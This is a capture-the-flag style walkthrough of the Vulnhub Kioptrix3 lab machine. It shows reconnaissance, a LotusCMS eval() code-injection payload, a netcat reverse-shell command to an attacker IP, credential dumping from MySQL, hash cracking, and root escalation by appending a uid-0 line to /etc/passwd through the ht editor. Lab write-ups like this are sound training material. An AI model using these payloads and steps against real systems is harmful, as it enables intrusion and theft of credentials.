---
layout: post
title: Kioptrix3 Vulnhub Walkthrough
categories: [Vulnhub]
tags: [ linux , RCE ]
toc: true
image:
  path: "/assets/images/kioptrix3/kio.png"
  alt: Vulnhub Kioptrix3
---

# Recon
## Nmap

nmap scan gave us only 2 ports : `80` and `22`:


```bash
nmap -p- -T4 192.168.1.14 -sC -sV -Pn

22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Ligoat Security - Got Goat? Security ...

```
## Port 80

The homepage of port 80 , shows a login panel with the name of the CMS used , in this case it's `LotusCms`,
![](/assets/images/kioptrix3/login.png)


we tried different login bypasses techniques but nothing worked , so lets use `searchsploit`:




```
searchsploit LotusCMS                                                                                         
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit)                                                                        | php/remote/18565.rb
LotusCMS 3.0.3 - Multiple Vulnerabilities                                                                                            | php/webapps/16982.txt
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
# RCE

From the results there is an RCE exploit for this CMS , lets copy it to our working directory and analyse it: 

```
searchsploit -m php/remote/18565.rb

cat 18565.rb

```
After reading through the exploit it seems that it's sending a `POST` request with a parameter named `page` , lets do that using `Burpsuite`:

I tried many payloads to get an RCE but the one that worked for me is this , the `index` word is needed to make this work , we will know why when we read the code after reverseshell :

```
page=index');eval("system('whoami');");#
```
![](/assets/images/kioptrix3/RCE.png)

So now we have code execution , lets get a reverse shell using `nc`

## Shell as www-data
```bash
page=index');eval("system('nc+-e+/bin/bash+192.168.1.8+9001');");#
```
On our attacker box we set up a Netcat listener , and we got a foothold on the box :

```bash
www-data@Kioptrix3:/home/www/kioptrix3.com$ whoami
www-data

```
Viewing the local network status using this command  reveals an `Mysql` instance running locally :

```
netstat -antup 

127.0.0.1:3309

```
IN order to exploit it further we need valid creds , so lets search php files to find some:


```
grep -Ri 'sql' . --color=auto

./gallery/gconfig.php:  $GLOBALS["gallarific_mysql_server"] = "localhost";
./gallery/gconfig.php:  $GLOBALS["gallarific_mysql_database"] = "gallery";
./gallery/gconfig.php:  $GLOBALS["gallarific_mysql_username"] = "root";
./gallery/gconfig.php:  $GLOBALS["gallarific_mysql_password"] = "fuckeyou";

```
Bingo , now we have valid creds as `root` to `Mysql` instance, lets view databases informations and dump tables data :
```
www-data@Kioptrix3:/home/www/kioptrix3.com$ mysql -uroot -pfuckeyou
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 7
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema | 
| gallery            | 
| mysql              | 
+--------------------+
3 rows in set (0.00 sec)

mysql> use gallery;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+----------------------+
| Tables_in_gallery    |
+----------------------+
| dev_accounts         | 
| gallarific_comments  | 
| gallarific_galleries | 
| gallarific_photos    | 
| gallarific_settings  | 
| gallarific_stats     | 
| gallarific_users     | 
+----------------------+
7 rows in set (0.00 sec)

mysql> select * from dev_accounts;
+----+------------+----------------------------------+
| id | username   | password                         |
+----+------------+----------------------------------+
|  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 | 
|  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e | 
+----+------------+----------------------------------+

```
## Shell as Loneferret
we use crackstation to find these hashes and put them in our creds file : 

```
dreg:Mast3r
loneferret:starwars
```
we can now switch our user to `loneferret` , or we can connect with it through `ssh` since it is open .

```
 su loneferret
Password: 
loneferret@Kioptrix3:/home/www/kioptrix3.com$ 

```
using `sudo -l`, we see that this user can run a command called `ht`, searching around , i found it's an old editor . So how can we abuse it to escacalate our privileges 



```bash

sudo -l
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
```

## Privesc
An easy method is to use it to edit the `/etc/passwd` file and add our root made user `levay` , using this line :

`
levay:$1$wxlphFbS$w4ZyKO.rbUpYGdps2TvNn0:0:0:levay:/home/levay:/bin/bash
`
lets do that :

we run `sudo /usr/local/bin/ht`  and type `loneferret` password , we click `alt+f` to open `/etc/passwd` 

![](/assets/images/kioptrix3/open.png)

after that we copy and paste our line in the last line :

![](/assets/images/kioptrix3/add.png)

and to quit we click `alt+f` and choose save and then quit .

we switch now our user to `levay` and we are `root `:

```
su levay
Password: 
root@Kioptrix3:/home/loneferret# id
uid=0(root) gid=0(root) groups=0(root)
root@Kioptrix3:/home/loneferret# 

```

## After root code analyses:

I was first confused why the post request using `page` parameter require the index word for the RCE to work , but after shell and reaeding the file `/core/lib/router.php`we can see Inside the function, it retrieves two values from the URL parameters, specifically the "page" and "system" parameters, using a custom method called "getInputString." The default values for these parameters are set to "index" for "page" and "Page" for "system."

so index value is by default needed for this to work 
```
 $page = $this->getInputString("page", "index");

                //Get plugin request (if any)
                $plugin = $this->getInputString("system", "Page");

      

                        //Fetch the page and get over loading cache etc...
                        eval("new ".$plugin."Starter('".$page."');");
```
